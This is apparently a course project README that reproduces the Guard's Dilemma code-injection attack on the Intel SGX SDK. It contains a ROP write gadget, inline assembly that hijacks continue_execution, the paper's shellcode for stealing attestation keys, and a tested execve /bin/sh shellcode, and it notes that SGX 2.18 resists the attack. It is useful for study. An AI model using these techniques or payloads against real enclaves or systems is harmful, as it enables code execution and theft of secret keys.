# This is the Final Product

## How Attack Works
The paper introduces two attacks, ORET-CONT loop and CONT loop. asm_oret is a function that restores some registers and is used to switch context after an OCALL. continue_execution is a function that restores all general purpose registers after an exception. 

This project uses the CONT loop.
Using the CONT loop, the attack uses a write gadget, which is part of "do_rdrand".
```
    mov dword ptr [rcx], eax
    mov eax, 1
    ret
```
Using ROPgadget or just reading the enclave.signed.io we can get addresses of asm_oret, continue_execution, and write gadget. 

The initial attack is conducted by calling the continue_execution using:
```
__asm__(
        "mov %0, %%rdi\n"
        "call %1\n"
        : // no output
        : "r" (tmp), "r" (addr)
        : "rdi"
    );
```
Which sets the rdi to the crafted context (register values we want to plant into the system) and calls continue_execution. This part is primitive but there are multiple ways to call continue_execution. 

### Ways to call continue_execution
To call continue execution you need two things. Control over the rdi register (to pass the crafted context) and the rip register (since we need to call this function). Any memory vulnerability that allows this can be used. 

Paper introduces the use of asm_oret to do this. To use asm_oret we only need buffer overflow. Paper states to overflow the return address to the address of asm_oret followed by the crafted context for oret to use (which will carry the rdi value for continue_execution and the stack will probably end with address of continue execution to start the ORET-CONT loop). 

the ORET-CONT loop allows asm_oret to call continue_execution. continue_execution will call the gadget and since continue_execution controls the rsp, asm_oret can be called after the gadget. 

### After continue_execution

One distinct part of this attack is that we need some structures (crafted stack and context) within the memory accessible to the enclave. This does not require this structure to be within trusted memory as enclave has access to untrusted memory. To do this structure is written within the application code. 

The stack is filled with the address to continue_execution. And cpu_context is crafted containing a rflag (not setting rflag seem to trigger Trace/Breakpoint signal) to 530. rax is set to the 4 bytes of code to be written and rcx points to the destination to write the code.

The paper becomes rather vague about this destination. Basically the write gadget is used to write code into this area and continue execution will execute the code by changing the rip to the first instruction of injected code. 

So this is basically a ROP based code injection displaying the Guards Dilemma where SGX SDK is tricked by the attacker to inject and execute malicious code. (In that sense we cover a lot of things we saw in this class)

### The injected code

For sake of simplicity the code is injected into the stack. That is the fake stack we created. There are two injected codes one is commented out because it doesn't work. This is due to the 'enclu' instruction. This instruction is specifically for SGX CPU regarding enclaves. 

### Injected Code #1 (commented out) Remote Attestation Attack

The benefit of this attack is the ROP code is executed within the enclave. This allows the attacker to attack remote attestation and act as if they are the enclave. This shell code is introduced within the paper. The bytes are successfully printed into the stack however it is not disassembled properly (due to enclu).

Code injection can be done on application level however this attack displays how much power continue_execution gives to the attacker. Not only do we control return address like a traditional buffer overflow based ROP but we control every general purpose register. 

The shell code introduced in the paper:
```
### Initial register state :
### rax = 0 ( EREPORT leaf )
### rbx = EEXIT return address
### rcx = 512+512+64
### ( total size of structures )
### rdx = writable 512 - byte aligned enclave
### area for temporary data
### rdi = writable 512 - byte aligned enclave
### area to copy structures into
### rsi = address of attacker ’s KEYREQUEST +
### TARGETINFO + REPORTDATA
### rbp = address of attacker ’s key buffer
### rsp = writable area for shellcode stack
push rbx
push rdi
### Copy KEYREQUEST , TARGETINFO ,
### REPORTDATA to enclave memory
rep movsb
### EREPORT
lea rcx , [ rdi -64]
lea rbx , [ rcx -512]
enclu
### Copy report ’s ISVSVN to KEYREQUEST
pop rbx
mov ax , [ rdx +258]
mov [ rbx +4] , ax
### Copy report ’s CPUSVN to KEYREQUEST
vmovdqa xmm0 , [ rdx ]
vmovdqu [ rbx +8] , xmm0
### Copy report ’s KEYID to KEYREQUEST
vmovdqa ymm0 , [ rdx +384]
vmovdqu [ rbx +40] , ymm0
### EGETKEY
push rdx
pop rcx
mov al , 1
enclu
### Copy key to attacker ’s memory
movdqa xmm0 , [ rdx ]
movdqu [ rbp ], xmm0
### EEXIT to attacker ’s code
pop rbx
mov al , 4
enclu

```

### Injected Code #2 Shell (tested on Ubuntu 20.04 VM and Ubuntu 18 Server Azure)

To test the injection and execution of code we used basic shell code.

```
            6a 42                   push   0x42
            58                      pop    rax
            fe c4                   inc    ah
            48 99                   cqo
            52                      push   rdx
            48 bf 2f 62 69 6e 2f    movabs rdi, 0x68732f2f6e69622f
            2f 73 68
            57                      push   rdi
            54                      push   rsp
            5e                      pop    rsi
            49 89 d0                mov    r8, rdx
            49 89 d2                mov    r10, rdx
            0f 05                   syscall
```
This can be done without using enclave. Actually it can be done easier that way however the purpose of this is to present how we can control registers to inject code and execute them (like done in the paper).

# SGX 2.18
The SGX 2.18 is the latest available in Linux-IntelSGX github. Attack does not work for this version. Maybe further investigation can be done as to why it doesn't work and how Intel has patched the SGX-SDK after release of papers such as Guard's Dilemma and SnakeGX.
